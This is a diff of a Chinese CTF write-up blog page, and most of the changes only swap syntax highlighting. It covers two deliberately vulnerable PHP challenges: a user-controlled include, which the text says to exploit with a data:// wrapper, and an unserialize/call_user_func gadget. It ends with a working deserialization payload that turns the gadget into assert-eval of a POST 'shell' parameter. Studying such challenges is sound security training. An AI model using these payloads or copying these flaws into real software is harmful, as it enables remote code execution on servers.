@@ -200,7 +200,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      512 字
+      473 字
     </span>
   
 
@@ -210,7 +210,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      9
+      8
        分钟
     </span>
   
@@ -256,27 +256,27 @@
               <h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><ul>
 <li>文件包含</li>
 </ul>
-<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
-<span class="hljs-comment">/*</span>
-<span class="hljs-comment"># -*- coding: utf-8 -*-</span>
-<span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span>
-<span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2021-06-29 03:16:43</span>
-<span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span>
-<span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2021-06-30 04:43:37</span>
-<span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span>
-<span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span>
-<span class="hljs-comment"></span>
-<span class="hljs-comment">*/</span>
+<span class="token comment">/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2021-06-29 03:16:43
+# @Last Modified by:   h1xa
+# @Last Modified time: 2021-06-30 04:43:37
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
 
-highlight_file(<span class="hljs-keyword">__FILE__</span>);
+*/</span>
 
-<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;
-    $ext = pathinfo($_GET[<span class="hljs-string">&#x27;file&#x27;</span>], PATHINFO_EXTENSION);
-    <span class="hljs-keyword">if</span>($ext===<span class="hljs-string">&#x27;php&#x27;</span>)&#123;
-        <span class="hljs-keyword">include</span> $_GET[<span class="hljs-string">&#x27;file&#x27;</span>];
-    &#125;
-&#125;</code></pre></code></pre>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token operator">===</span><span class="token single-quoted-string string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span></span></code></pre></code></pre>
 <p><code>pathinfo</code>要求传入的<code>file</code>后缀名为<code>php</code>，就会<code>include</code>      </p>
 <p>看到include要想到伪协议了    </p>
 <p>这里用<code>data://text/plain</code>     </p>
@@ -286,41 +286,41 @@ highlight_file(<span class="hljs-keyword">__FILE__</span>);
 <h2 id="cjbweb"><a href="#cjbweb" class="headerlink" title="cjbweb"></a>cjbweb</h2><ul>
 <li>代码审计</li>
 </ul>
-<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-error_reporting(<span class="hljs-number">0</span>);
-$safe=<span class="hljs-string">&quot;Hack me!&quot;</span>;
+<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$safe</span><span class="token operator">=</span><span class="token double-quoted-string string">"Hack me!"</span><span class="token punctuation">;</span>
 
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span>&#123;
-    <span class="hljs-keyword">public</span> $name=<span class="hljs-string">&quot;var_dump&quot;</span>;
-    <span class="hljs-keyword">public</span> $msg=<span class="hljs-string">&quot;Happy to cjb&quot;</span>;
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
-<span class="hljs-function">    </span>&#123;
-        <span class="hljs-keyword">global</span> $safe;
-        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/\d|\/|,|\([^()]*\([^()]*\)/&#x27;</span>,<span class="hljs-keyword">$this</span>-&gt;msg))&#123;
-            <span class="hljs-keyword">$this</span>-&gt;name=<span class="hljs-string">&quot;var_dump&quot;</span>;
-            <span class="hljs-keyword">$this</span>-&gt;msg=<span class="hljs-string">&quot;You look dangerous!!!&quot;</span>;
-            $safe=<span class="hljs-string">&quot;I think waf is enough.&quot;</span>;
-        &#125;
-        call_user_func(<span class="hljs-keyword">$this</span>-&gt;name,<span class="hljs-keyword">$this</span>-&gt;msg);
-    &#125;
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
-<span class="hljs-function">    </span>&#123;
-        <span class="hljs-keyword">global</span> $safe;
-        var_dump($safe);
-    &#125;
-&#125;
+<span class="token keyword">class</span> <span class="token class-name">Hacker</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token double-quoted-string string">"var_dump"</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token operator">=</span><span class="token double-quoted-string string">"Happy to cjb"</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">global</span> <span class="token variable">$safe</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/\d|\/|,|\([^()]*\([^()]*\)/'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">msg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token operator">=</span><span class="token double-quoted-string string">"var_dump"</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">msg</span><span class="token operator">=</span><span class="token double-quoted-string string">"You look dangerous!!!"</span><span class="token punctuation">;</span>
+            <span class="token variable">$safe</span><span class="token operator">=</span><span class="token double-quoted-string string">"I think waf is enough."</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">msg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">global</span> <span class="token variable">$safe</span><span class="token punctuation">;</span>
+        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$safe</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
 
-<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;info&#x27;</span>]))&#123;
-    $info=$_POST[<span class="hljs-string">&#x27;info&#x27;</span>];
-    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/s:4:&quot;name&quot;;s:\d:&quot;v\w*&quot;/&#x27;</span>,$info))&#123;
-        unserialize($info);
-    &#125;<span class="hljs-keyword">else</span>&#123;
-        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I just love v&quot;</span>;
-    &#125;
-&#125;<span class="hljs-keyword">else</span>&#123;
-    $hacker=<span class="hljs-keyword">new</span> Hacker();
-    highlight_file(<span class="hljs-keyword">__FILE__</span>);
-&#125;</code></pre></code></pre>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'info'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$info</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'info'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/s:4:"name";s:\d:"v\w*"/'</span><span class="token punctuation">,</span><span class="token variable">$info</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"I just love v"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$hacker</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span></code></pre></code></pre>
 <ul>
 <li><p>第一种思路：在类中写两次相同的属性名，后面的属性值会覆盖前面的属性值（类的属性个数要加1）<br>  <code>\([^()]*\([^()]*\)</code>这条正则过滤的时括号嵌套<code>(())</code>   </p>
 <p>  payload:<code>info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:22:&quot;eval($_POST[&#39;shell&#39;]);&quot;;&#125;&amp;&amp;shell=var_dump(scandir(&#39;/&#39;));</code><br>  <img src="https://ftp.bmp.ovh/imgs/2021/07/f084c58e911870b0.png" srcset="/img/loading.gif">    </p>
